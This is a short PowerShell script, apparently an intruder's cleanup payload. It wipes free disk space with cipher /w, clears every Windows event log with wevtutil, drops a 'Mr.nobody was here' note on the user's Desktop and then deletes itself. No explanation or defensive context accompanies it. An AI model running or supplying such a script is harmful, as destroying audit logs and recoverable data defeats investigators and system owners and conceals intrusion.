cipher /w:c:\
wevtutil el | Foreach-Object {wevtutil cl "$_"}
Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here"
Remove-Item -Path $MyInvocation.MyCommand.Source -Force
